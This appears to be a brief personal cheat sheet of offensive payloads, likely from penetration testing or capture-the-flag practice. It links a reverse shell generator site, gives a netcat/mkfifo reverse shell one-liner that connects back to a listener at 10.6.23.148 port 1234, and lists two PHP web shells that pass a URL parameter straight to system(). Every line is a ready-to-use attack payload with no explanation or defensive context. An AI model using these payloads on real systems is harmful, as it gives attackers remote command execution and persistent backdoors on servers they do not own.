# Basic things
## online reverse shell editor
* https://www.revshells.com/
## netcat reverse shell
* rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.23.148 1234 >/tmp/f
## php web shell
* &lt;?php system($_GET['cmd']); ?&gt;
* &lt;?php system($_GET[1]); ?&gt;